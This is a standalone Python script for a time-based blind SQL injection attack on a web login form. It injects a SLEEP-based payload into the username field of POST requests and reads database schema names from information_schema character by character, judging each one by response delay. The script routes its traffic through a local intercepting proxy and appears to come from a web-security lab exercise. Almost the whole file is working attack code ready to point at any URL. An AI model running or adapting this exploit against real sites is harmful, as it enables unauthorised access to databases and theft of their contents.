import sys
import requests

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_exploit(url):
    extracted_data = ""
    for i in range(1, 65):  
        for j in range(32, 126):  
            sql_payload = "' OR IF(ASCII(SUBSTRING((SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.schemata), %s, 1)) = %s, SLEEP(2), SLEEP(0))-- -" % (i, j)
            
            post_data = {
                'username': 'ad' + sql_payload,  
                'password': 'ad'  
            }

            r = requests.post(url, data=post_data, verify=False, proxies=proxies)

            if int(r.elapsed.total_seconds()) > 1.5:  
                extracted_data += chr(j) 
                sys.stdout.write('\r' + extracted_data)  
                sys.stdout.flush()  
                break  
        else:
            sys.stdout.write('\r' + extracted_data)  
            sys.stdout.flush()

    return extracted_data

def main():
    if len(sys.argv) != 2:
        sys.exit(-1)

    url = sys.argv[1]
    extracted_data = sqli_exploit(url)
    print("\n(+) Extracted Data: %s" % extracted_data)

if __name__ == "__main__":
    main()